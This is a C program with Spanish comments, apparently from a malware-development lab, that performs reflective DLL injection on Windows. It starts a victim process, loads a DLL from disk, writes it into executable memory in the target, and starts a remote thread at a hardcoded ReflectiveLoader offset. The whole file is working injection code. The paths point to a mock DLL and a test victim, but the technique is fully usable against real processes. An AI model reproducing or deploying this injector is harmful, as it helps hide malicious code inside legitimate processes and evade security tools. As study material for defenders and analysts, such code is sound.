#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>



PROCESS_INFORMATION setup_victim(void) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // usar cadena mutable porque CreateProcess puede modificarla
    char cmd[] = "C:\\Windows\\System32\\cmd.exe /k";
    char victim[] = "C:\\Users\\test\\Desktop\\mal-dev-lab\\process-injection\\reflective\\bin\\victima.exe";
    BOOL ok = CreateProcessA(
        NULL,       // lpApplicationName
        victim,        // lpCommandLine (mutable)
        NULL,       // lpProcessAttributes
        NULL,       // lpThreadAttributes
        FALSE,      // bInheritHandles
        CREATE_NEW_CONSOLE, // abrir nueva consola pasa ver la salida estandar
        NULL,       // lpEnvironment
        NULL,       // lpCurrentDirectory
        &si,
        &pi
    );

    if (!ok) {
        DWORD err = GetLastError();
        fprintf(stderr, "CreateProcess failed: %lu\n", err);
        // devolver un PROCESS_INFORMATION con handles NULL para indicar fallo
        PROCESS_INFORMATION empty = {0};
        return empty;
    }
    
    printf("PID = %lu\n", (unsigned long)pi.dwProcessId);
    return pi;
}

void* setup_dll(long *dll_size){
    FILE *f = fopen("C:\\Users\\test\\Desktop\\mal-dev-lab\\process-injection\\reflective\\bin\\mockdll.dll", "rb"); // Lectura binaria
    if (!f) {
        perror("fopen");
        return NULL;
    }

    fseek(f, 0, SEEK_END);      // Mueve el puntero del fichero
    long size = ftell(f);       // Devuelve la posición actual del puntero
    fseek(f, 0, SEEK_SET);      // Mueve el puntero del fichero al principio

    unsigned char *buffer = malloc(size);   // Reservar memoria en el heap
    if (!buffer) {
        perror("malloc");
        fclose(f);
        return NULL;
    }

    fread(
        buffer, // Dirección de memoria donde se almacenarán los bytes leídos del archivo
        1,      // Tamaño de cada elemento a leer en bytes (1 byte por elemento)
        size,   // Número de elementos a leer (en total se leerán 'size' bytes)
        f       // Puntero al archivo abierto desde el que se leerán los datos
    );

    fclose(f);

    printf("DLL cargada en memoria, tamanyo: %ld bytes, direccion: %p\n", size, (void*)buffer);
    *dll_size = size;
    return buffer;
}

int main(void) {
    // Creamos proceso victima
    PROCESS_INFORMATION pi = setup_victim();
    if (pi.hProcess == NULL) {
        fprintf(stderr, "No se pudo crear el proceso.\n");
        return 1;
    }

    // Cargamos en memoria la dll
    long dll_size = 0;
    void* buffer = setup_dll(&dll_size);
    if (buffer == NULL) {
        fprintf(stderr, "No se pudo cargar la dll.\n");
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    // Reservamos memoria en la victima
    LPVOID allocated_mem = VirtualAllocEx(pi.hProcess, NULL, dll_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (allocated_mem == NULL) {
        printf("Failed to allocate memory in remote process: %d\n", GetLastError());
        return 1;
    }
    printf("Memory allocated at: %p\n", allocated_mem);
    
    WriteProcessMemory(pi.hProcess, allocated_mem, buffer, dll_size, NULL);

    LPVOID start = (LPVOID)((unsigned char*)allocated_mem + 0x446);
    printf("ReflectiveLoader() at: %p\n", start);
    HANDLE hThread = CreateRemoteThread(
        pi.hProcess,                                 // hProcess: HANDLE del proceso remoto (donde crear el hilo)
        NULL,                                        // lpThreadAttributes: atributos de seguridad del hilo (NULL = default)
        0,                                           // dwStackSize: tamaño de la pila para el hilo (0 = tamaño por defecto)
        (LPTHREAD_START_ROUTINE)start,               // lpStartAddress: dirección de la función en el proceso remoto donde arrancará el hilo
        allocated_mem,                               // lpParameter: parámetro (LPVOID) que se pasará como argumento a la función remota
        0,                                           // dwCreationFlags: flags de creación (0 = crear y ejecutar inmediatamente)
        NULL                                         // lpThreadId: puntero a DWORD para recibir el id del hilo creado (NULL = no pedirlo)
    );    
    if (hThread == NULL) {
        printf("Failed to create thread in remote process: %d\n", GetLastError());
        return 1;
    }

    // Cerrar handles sólo cuando existen
    printf("Pulsa ENTER para terminar\n");
    getchar();
    free(buffer);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}